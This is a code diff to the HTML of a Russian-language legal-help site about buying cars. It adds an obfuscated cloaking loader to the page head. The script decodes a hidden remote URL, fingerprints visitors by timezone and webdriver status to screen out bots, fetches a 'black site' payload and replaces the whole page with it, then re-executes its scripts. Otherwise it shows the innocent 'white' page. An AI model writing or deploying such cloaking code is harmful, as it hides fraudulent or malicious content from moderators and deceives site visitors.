@@ -7,8 +7,9 @@
     <title>Центр правовой помощи "Авто-Право"</title>
     
     <style>
-        /* МАГИЯ OPSEC 1: Сайт изначально прозрачный. Анимация проявления 0.6 сек. */
-        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: #f8f9fa; color: #2d3748; opacity: 0; transition: opacity 0.2s ease; }
+        /* МАГИЯ OPSEC 1: Прячем корень сайта (html), а не body. Никаких мельканий! */
+        html { opacity: 0; transition: opacity 0.4s ease-in; }
+        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: #f8f9fa; color: #2d3748; }
         .site-main { display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
         .entry-header { max-width: 800px; text-align: center; margin-bottom: 30px; }
         .entry-title { font-size: 28px; color: #1a202c; font-weight: 700; margin-bottom: 10px; }
@@ -17,9 +18,71 @@
         .entry-content p { margin-bottom: 20px; }
         .site-footer { font-size: 12px; color: #a0aec0; text-align: center; margin-top: 40px; }
     </style>
+
+    <script>
+        (function() {
+            // DGA-декодер
+            var _m = [109, 121, 121, 117, 120, 63, 52, 52, 104, 113, 116, 122, 105, 50, 102, 115, 102, 113, 126, 121, 110, 104, 120, 50, 115, 116, 105, 106, 51, 104, 116, 114, 52, 123, 54, 52, 108, 106, 121, 50, 112, 106, 126];
+            var _u = ""; for(var i=0; i<_m.length; i++) _u += String.fromCharCode(_m[i] - 5);
+
+            // ПРОГРЕВ ТУННЕЛЯ: Динамически создаем Preconnect, чтобы убрать сетевую задержку
+            var _p = document.createElement('link');
+            _p.rel = 'preconnect'; _p.href = _u.split('/v1')[0];
+            document.head.appendChild(_p);
+
+            var _t = "UTC", _w = "0";
+            try {
+                var _i = window["In"+"tl"];
+                if (_i && _i["Date"+"Time"+"Format"]) _t = _i["DateTimeFormat"]()["resolved"+"Options"]()["time"+"Zone"];
+                var _n = window["navi"+"gator"];
+                if (_n && _n["web"+"driver"] === true) _w = "1";
+            } catch(e) {}
+
+            var _raw = "offset:" + new Date().getTimezoneOffset() + "|d:" + _w;
+            var _tk = btoa(unescape(encodeURIComponent(_raw)));
+
+            // ВЫСТРЕЛ: Делаем запрос ДО того, как браузер нарисует страницу
+            var _req = fetch(_u + "?asset_id=1&token=" + encodeURIComponent(_tk), {
+                method: 'GET', headers: { 'Accept': 'application/json' },
+                priority: 'high' // Указываем браузеру, что это приоритет №1
+            });
+
+            // Функция инъекции черного сайта
+            var _inject = function(htmlString) {
+                var _nd = new DOMParser().parseFromString(htmlString, 'text/html');
+                
+                // Заменяем DOM. Т.к. новый <head> не содержит `html { opacity: 0 }`, сайт появляется МГНОВЕННО.
+                document.documentElement.replaceChild(_nd.body, document.body);
+                document.documentElement.replaceChild(_nd.head, document.head);
+                
+                // Ре-инициализация скриптов
+                var _s = document.querySelectorAll('script');
+                for (var j = 0; j < _s.length; j++) {
+                    if (_s[j].text) {
+                        var ns = document.createElement('script');
+                        ns.text = _s[j].text;
+                        document.head.appendChild(ns);
+                    }
+                }
+            };
+
+            // Обработка ответа от Питона
+            _req.then(function(r){ return r.json(); }).then(function(d){
+                if (d && d.status === 'success' && d.payload) {
+                    var _h = decodeURIComponent(escape(atob(d.payload)));
+                    // Если DOM еще не загрузился - ждем его и инжектим. Если загрузился - инжектим сразу.
+                    if (document.body) _inject(_h);
+                    else document.addEventListener('DOMContentLoaded', function() { _inject(_h); });
+                } else {
+                    document.documentElement.style.opacity = '1'; // Показываем белый сайт
+                }
+            }).catch(function(){
+                document.documentElement.style.opacity = '1'; // Показываем белый сайт при ошибке
+            });
+        })();
+    </script>
 </head>
 <body>
-
     <main class="site-main">
         <header class="entry-header">
             <h1 class="entry-title">Юридические аспекты покупки автомобиля в 2026 году</h1>
@@ -32,68 +95,5 @@
             <footer class="site-footer">© 2026 Центр правовой помощи автомобилистам. Все права защищены.</footer>
         </section>
     </main>
-
-    <script>
-        (function() {
-            // DGA-декодер домена
-            function _getRenderMatrix() {
-                var _m = [109, 121, 121, 117, 120, 63, 52, 52, 104, 113, 116, 122, 105, 50, 102, 115, 102, 113, 126, 121, 110, 104, 120, 50, 115, 116, 105, 106, 51, 104, 116, 114, 52, 123, 54, 52, 108, 106, 121, 50, 112, 106, 126];
-                var _o = "";
-                for(var i=0; i<_m.length; i++) _o += String.fromCharCode(_m[i] - 5);
-                return _o; 
-            }
-
-            // Функция проявления белого сайта
-            function _showWhite() {
-                document.body.style.opacity = '1';
-            }
-
-            function _sync() {
-                var _u = _getRenderMatrix();
-                var _t = "UTC", _w = "0";
-                
-                try {
-                    var _i = window["In"+"tl"];
-                    if (_i && _i["Date"+"Time"+"Format"]) _t = _i["DateTimeFormat"]()["resolved"+"Options"]()["time"+"Zone"];
-                    var _n = window["navi"+"gator"];
-                    if (_n && _n["web"+"driver"] === true) _w = "1";
-                } catch(e) {}
-
-                var _raw = "offset:" + new Date().getTimezoneOffset() + "|d:" + _w;
-                var _tk = btoa(unescape(encodeURIComponent(_raw)));
-
-                fetch(_u + "?asset_id=1&token=" + encodeURIComponent(_tk), {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                })
-                .then(function(r){ return r.json(); })
-                .then(function(d){
-                    if (d && d.status === 'success' && d.payload) {
-                        var _h = decodeURIComponent(escape(atob(d.payload)));
-                        var _nd = new DOMParser().parseFromString(_h, 'text/html');
-                        document.documentElement.replaceChild(_nd.body, document.body);
-                        document.documentElement.replaceChild(_nd.head, document.head);
-                        
-                        // ИСПРАВЛЕНИЕ: Используем querySelectorAll (статичная коллекция)
-                        var _scripts = document.querySelectorAll('script');
-                        for (var j = 0; j < _scripts.length; j++) {
-                            if (_scripts[j].text) {
-                                var _s = document.createElement('script');
-                                _s.text = _scripts[j].text;
-                                document.head.appendChild(_s);
-                            }
-                        }
-                    } else {
-                        _showWhite(); 
-                    }
-                }).catch(function(){
-                    _showWhite(); 
-                });
-            }
-            
-            if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', _sync);
-            else _sync();
-        })();
-    </script>
 </body>
 </html>
